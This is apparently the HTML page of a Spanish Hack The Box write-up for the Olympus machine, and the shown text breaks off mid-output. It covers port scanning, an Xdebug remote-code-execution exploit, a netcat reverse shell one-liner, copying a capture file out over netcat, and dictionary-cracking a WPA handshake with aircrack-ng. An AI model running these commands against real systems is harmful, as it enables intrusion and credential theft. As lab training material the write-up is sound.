@@ -1,0 +1,956 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Olympus - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Olympus en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Olympus">
+<meta property="og:url" content="http://localhost:4000/htb-olympus/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Olympus en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-olympus/olympus.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-09-18T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-olympus/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Olympus</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Inteligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Olympus">
+    <meta itemprop="description" content="Resolución de la máquina Olympus en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="September 18, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Olympus
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-09-18T00:00:00-05:00">September 18, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-olympus/banner-olympus.jpg" alt="" /></p>
+
+<h2 id="olympus">Olympus</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.83.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.83
+PING 10.10.10.83 <span class="o">(</span>10.10.10.83<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.83: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>145 ms
+
+<span class="nt">---</span> 10.10.10.83 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 144.725/144.725/144.725/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.83 <span class="nt">-oG</span> allPorts
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-17 17:39 CDT
+Initiating Ping Scan at 17:39
+Scanning 10.10.10.83 <span class="o">[</span>4 ports]
+Completed Ping Scan at 17:39, 0.14s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 17:39
+Scanning 10.10.10.83 <span class="o">[</span>65535 ports]
+Discovered open port 53/tcp on 10.10.10.83
+Discovered open port 80/tcp on 10.10.10.83
+Discovered open port 2222/tcp on 10.10.10.83
+Completed SYN Stealth Scan at 17:40, 46.52s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.83
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65531 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 1 filtered tcp port <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>46.99 seconds
+           Raw packets sent: 76104 <span class="o">(</span>3.349MB<span class="o">)</span> | Rcvd: 76091 <span class="o">(</span>3.044MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.83
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 53,80,2222
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p53</span>,80,2222 10.10.10.83 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-17 17:42 CDT
+Nmap scan report <span class="k">for </span>10.10.10.83
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE VERSION
+53/tcp   open  domain  <span class="o">(</span>unknown banner: Bind<span class="o">)</span>
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|     <span class="nb">bind</span>
+|_    Bind
+| dns-nsid: 
+|_  bind.version: Bind
+80/tcp   open  http    Apache httpd
+|_http-title: Crete island - Olympus HTB
+|_http-server-header: Apache
+2222/tcp open  ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-City of olympia
+| ssh-hostkey: 
+|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 <span class="o">(</span>ED25519<span class="o">)</span>
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+SF-Port53-TCP:V<span class="o">=</span>7.92%I<span class="o">=</span>7%D<span class="o">=</span>9/17%Time<span class="o">=</span>614519D5%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
+SF:ersionBindReqTCP,3F,<span class="s2">"</span><span class="se">\0</span><span class="s2">=</span><span class="se">\0\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">85</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\0\x</span><span class="s2">07version</span><span class="se">\x</span><span class="s2">
+SF:04bind</span><span class="se">\0\0\x</span><span class="s2">10</span><span class="se">\0\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\0\x</span><span class="s2">10</span><span class="se">\0\x</span><span class="s2">03</span><span class="se">\0\0\0\0\0\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">04Bind</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\</span><span class="s2">
+SF:0</span><span class="se">\x</span><span class="s2">02</span><span class="se">\0\x</span><span class="s2">03</span><span class="se">\0\0\0\0\0\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">0c"</span><span class="o">)</span><span class="p">;</span>
+<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+SF-Port2222-TCP:V<span class="o">=</span>7.92%I<span class="o">=</span>7%D<span class="o">=</span>9/17%Time<span class="o">=</span>614519D0%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
+SF:LL,29,<span class="s2">"SSH-2</span><span class="se">\.</span><span class="s2">0-City</span><span class="se">\x</span><span class="s2">20of</span><span class="se">\x</span><span class="s2">20olympia</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">
+SF:20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>27.19 seconds
+</code></pre></div></div>
+
+<p>Vemos que tiene el puerto 80 abierto, por lo que ya sabemos, tiramos de <code class="language-plaintext highlighter-rouge">whatweb</code> para ver a lo que nos enfretamos, podríamos ver vía web y nos encontramos una imagen:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.83/
+http://10.10.10.83/ <span class="o">[</span>200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.10.83], Title[Crete island - Olympus HTB], UncommonHeaders[x-content-type-options,xdebug], X-Frame-Options[sameorigin], X-XSS-Protection[1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block]
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-olympus/olympus_web.png" alt="" /></p>
+
+<p>Podríamos tirar un <code class="language-plaintext highlighter-rouge">wfuzz</code> para obtener recursos del sitio web; sin embargo, no nos va a arrojar algún resultado. A este punto, podríamos checar el <em>header</em> del servidor con la herramienta <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-I</span> <span class="nt">-X</span> OPTIONS http://10.10.10.83/
+HTTP/1.1 200 OK
+Date: Fri, 17 Sep 2021 23:09:34 GMT
+Server: Apache
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Frame-Options: sameorigin
+X-XSS-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+Xdebug: 2.5.5
+Content-Length: 314
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</code></pre></div></div>
+
+<p>Aqui vemos el uso de <em>Xdebug 2.5.5</em> el cual podríamos buscar si existe algún exploit público mediante <code class="language-plaintext highlighter-rouge">searchsploit</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit Xdebug 2.5.5
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+xdebug &lt; 2.5.5 - OS Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                                             | php/remote/44568.rb
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+Papers: No Results
+</code></pre></div></div>
+
+<p>Vemos que existen un módulo de metasploit, pero nosotros no ocupamos eso; así que buscamos un exploit en github:</p>
+
+<p><a href="https://github.com/k4miyo/Xdebug-Command-Execution">Xdebug Command Execution</a></p>
+
+<p>Nos descargamos el exploit y procedemos a ejecutarlo indicandole los valores que nos solicita.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 xdebug_rce.py <span class="nt">--rhost</span> 10.10.10.83 <span class="nt">--lhost</span> 10.10.14.16
+<span class="o">[</span>+] Payload: Connection received from 10.10.10.83:41632 on port 9000
+<span class="o">[</span>+] Trying to <span class="nb">bind </span>to :: on port 443: Done
+<span class="o">[</span>+] Waiting <span class="k">for </span>connections on :::443: Got connection from ::ffff:10.10.10.83 on port 59748
+<span class="o">[</span>+] Reverse shell: Established connection
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span><span class="nb">whoami
+</span>www-data
+</code></pre></div></div>
+
+<p>Para trabajar más cómodos, nos entablamos una reverse shell. Así mismo, hacemos un <a href="/tratamiento-tty">Tratamiento de la tty</a>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-e</span> /bin/sh 10.10.14.16 443
+<span class="nv">$ </span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.16] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.83] 59750
+<span class="nb">whoami
+</span>www-data
+</code></pre></div></div>
+
+<p>Observando un poco la terminal, vemos que nos encontramos en un contenedor, debido a que el prompt se nota <code class="language-plaintext highlighter-rouge">www-data@f00ba96171c5:/var/www/html</code>, además de que la dirección IP no corresponde con la máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ww-data@f00ba96171c5:/var/www/html<span class="nv">$ </span>ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:42:ac:14:00:02  
+          inet addr:172.20.0.2  Bcast:172.20.255.255  Mask:255.255.0.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:645 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:501 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:45176 <span class="o">(</span>44.1 KiB<span class="o">)</span>  TX bytes:50772 <span class="o">(</span>49.5 KiB<span class="o">)</span>
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:0 <span class="o">(</span>0.0 B<span class="o">)</span>  TX bytes:0 <span class="o">(</span>0.0 B<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Vamos a dirigirnos a la ruta <code class="language-plaintext highlighter-rouge">/home/</code> y encontramos una carpeta del usuario <code class="language-plaintext highlighter-rouge">zeus</code>; nos metemos en dicha carpeta y vemos otra con nombre <code class="language-plaintext highlighter-rouge">airgeddon</code>, que investigando un poco, notamos que se trata de un programa para realizar auditorías Wi-Fi en Linux. Por lo tanto ingresamos en dicha carpeta y posterior a <code class="language-plaintext highlighter-rouge">captured</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@f00ba96171c5:/home/zeus/airgeddon/captured<span class="nv">$ </span><span class="nb">pwd</span>
+/home/zeus/airgeddon/captured
+www-data@f00ba96171c5:/home/zeus/airgeddon/captured<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 296
+<span class="nt">-rw-r--r--</span> 1 zeus zeus 297917 Apr  8  2018 captured.cap
+<span class="nt">-rw-r--r--</span> 1 zeus zeus     57 Apr  8  2018 papyrus.txt
+www-data@f00ba96171c5:/home/zeus/airgeddon/captured<span class="nv">$ </span><span class="nb">cat </span>papyrus.txt 
+Captured <span class="k">while </span>flying. I<span class="s1">'ll banish him to Olympia - Zeus
+www-data@f00ba96171c5:/home/zeus/airgeddon/captured$
+</span></code></pre></div></div>
+
+<p>Aquí vemos dos archivos, uno <code class="language-plaintext highlighter-rouge">papyrus.txt</code> que contiene la leyenda <code class="language-plaintext highlighter-rouge">Captured while flying. I'll banish him to Olympia - Zeus</code> y otro <code class="language-plaintext highlighter-rouge">captured.cap</code>; por lo que nos indica que debemos de hacer algo que el archivo <code class="language-plaintext highlighter-rouge">.cap</code>, así que nos lo pasamos a nuestra máquina para analizarlo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@f00ba96171c5:/home/zeus/airgeddon/captured<span class="nv">$ </span>nc 10.10.14.16 4646 &lt; captured.cap
+
+^C
+www-data@f00ba96171c5:/home/zeus/airgeddon/captured<span class="err">$</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 4646 <span class="o">&gt;</span> captured.cap
+listening on <span class="o">[</span>any] 4646 ...
+connect to <span class="o">[</span>10.10.14.16] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.83] 40066
+</code></pre></div></div>
+
+<p>Esperamos unos segundos y cancelamos en la máquina víctima. Ahora vamos a validar que la información haya sido enviada correctamente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@f00ba96171c5:/home/zeus/airgeddon/captured<span class="nv">$ </span><span class="nb">du</span> <span class="nt">-hc</span> captured.cap 
+292K    captured.cap
+292K    total
+www-data@f00ba96171c5:/home/zeus/airgeddon/captured<span class="nv">$ </span><span class="nb">md5sum </span>captured.cap 
+2a86b639f23067dd95a5e0b5f616ef20  captured.cap
+www-data@f00ba96171c5:/home/zeus/airgeddon/captured<span class="err">$</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">du</span> <span class="nt">-hc</span> captured.cap
+292K    captured.cap
+292K    total
+❯ <span class="nb">md5sum </span>captured.cap
+2a86b639f23067dd95a5e0b5f616ef20  captured.cap
+</code></pre></div></div>
+
+<p>Vemos que ambos archivos tienen el mismo peso y mismo hash, así que tenemos la certeza de que se transfirió correstamente. Vamos a analizarlo en nuestra máquina con la herramienta <code class="language-plaintext highlighter-rouge">aircrack-ng</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aircrack-ng captured.cap
+Reading packets, please wait...
+Opening captured.cap
+Read 6498 packets.
+
+   <span class="c">#  BSSID              ESSID                     Encryption</span>
+
+   1  F4:EC:38:AB:A8:A9  Too_cl0se_to_th3_Sun      WPA <span class="o">(</span>1 handshake<span class="o">)</span>
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening captured.cap
+Read 6498 packets.
+
+1 potential targets
+
+Please specify a dictionary <span class="o">(</span>option <span class="nt">-w</span><span class="o">)</span><span class="nb">.</span>
+
+❯ aircrack-ng <span class="nt">-J</span> Captura captured.cap                                                                                            
+Reading packets, please wait...                                                                                                  
+Opening captured.cap
+Read 6498 packets.                                              
+                                                                
+   <span class="c">#  BSSID              ESSID                     Encryption</span>
+                                                                
+   1  F4:EC:38:AB:A8:A9  Too_cl0se_to_th3_Sun      WPA <span class="o">(</span>1 handshake<span class="o">)</span>
+                                
+Choosing first network as target.                  
+                                
+Reading packets, please wait...                                 
+Opening captured.cap                                            
+Read 6498 packets.                                              
+                                                                
+1 potential targets                                             
+                                                                
+                                                                
+                                
+Building Hashcat file...
+                                                                
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ESSID <span class="o">(</span>length: 20<span class="o">)</span>: Too_cl0se_to_th3_Sun
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key version: 2
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> BSSID: F4:EC:38:AB:A8:A9                                    
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> STA: C0:EE:FB:DF:FC:2A
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> anonce:
+    8F FA CA 5A 25 EB 30 36 44 2F 5E E9 C6 34 A5 E8 
+    68 09 B1 53 55 F1 B6 92 2E 8A 9A 58 94 98 C9 29 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> snonce:
+    B3 07 A4 0F 83 CE 69 EA 11 03 A3 2A 8D 6C 29 A4 
+    64 BD 91 FA 5F F3 CE A5 25 0D 45 48 EE AC AC 34 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key MIC:
+    AC 1A 73 84 FB BF 75 9C 86 CF 5B 5A F4 8A 4C 38
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> eapol:
+    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
+    01 B3 07 A4 0F 83 CE 69 EA 11 03 A3 2A 8D 6C 29 
+    A4 64 BD 91 FA 5F F3 CE A5 25 0D 45 48 EE AC AC 
+    34 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
+    04 01 00 00 0F AC 02 00 00
+</code></pre></div></div>
+
+<p>Con el comando <code class="language-plaintext highlighter-rouge">aircrack-ng captured.cap</code> podemos ver los datos relacionados a la captura. De los resultados arrojados, vemos que el <strong>ESSID</strong> tiene un valor <em>raro</em>: <strong><em>Too_cl0se_to_th3_Sun</em></strong> que igual y puede ser una contraseña, por lo que la guardamos.</p>
+
+<p>Ahora, como el comando <code class="language-plaintext highlighter-rouge">aircrack-ng -J Captura captured.cap</code> creamos el archivo <code class="language-plaintext highlighter-rouge">Captura.hccap</code> el cual contiene la información más relevante de la captura y con el cual obtendremos un hash para posterior crackearlo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hccap2john Captura.hccap
+Too_cl0se_to_th3_Sun:<span class="nv">$WPAPSK$Too_cl0se_to_th3_Sun</span><span class="c">#xCkseuWdkCvvrzkegkSY1sDCOScF.uAeXKkdd4GxYTdTwwuZ7Ep3GCugf1GDygdO7SgkBYEjLib4B8LcO.alIpLlhd6iWddMZ7X78E21.5I0.Ec............/gkSY1sDCOScF.uAeXKkdd4GxYTdTwwuZ7Ep3GCugf1E.................................................................3X.I.E..1uk2.E..1uk2.E..1uk0..01b4et9gC6AIfumdP01HPcoP0q81Iv4uemh9zM/L33UBjp....................................................................................................................................../t.....U...8kOQsHvjrKQVgxPKjG8H1U:c0eefbdffc2a:f4ec38aba8a9:f4ec38aba8a9::WPA2:Captura.hccap</span>
+</code></pre></div></div>
+
+<p>Antes de btener la contraseña, vamos a pensar en las pistas que nos proporciona la máquina. Recordemos que existe el archivo <code class="language-plaintext highlighter-rouge">papyrus.txt</code> el cual tiene el texto: <em>Captured while flying. I’ll banish him to Olympia - Zeus</em>; aquí nos habla de dioses de la mitología griega relacionados con un vuelo, por lo que buscando un poco en <a href="https://www.google.com/">Google</a></p>
+
+<p><img src="/assets/images/htb-olympus/olympus_icaro.png" alt="" /></p>
+
+<p>Vemos que se trata de <strong><em>Icaro</em></strong> o <strong><em>Icarus</em></strong>, así que nos vamos a crear un direccionario a partir de <code class="language-plaintext highlighter-rouge">rockyou.txt</code> de aquellas palabras que contengan <em>icar</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> /usr/share/wordlists/rockyou.txt | <span class="nb">grep</span> <span class="s2">"icar"</span> <span class="o">&gt;</span> diccionario.txt
+</code></pre></div></div>
+
+<p>Ahora si procedemos a obtener la contraseña:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aircrack-ng <span class="nt">-w</span> diccionario.txt captured.cap
+
+                               Aircrack-ng 1.6 
+
+      <span class="o">[</span>00:00:14] 4555/4591 keys tested <span class="o">(</span>332.14 k/s<span class="o">)</span> 
+
+      Time left: 0 seconds                                      99.22%
+
+                        KEY FOUND! <span class="o">[</span> flightoficarus <span class="o">]</span>
+
+
+      Master Key     : B1 D1 0A 51 A8 BF F2 F9 35 BC 56 5E 30 CA D5 4D 
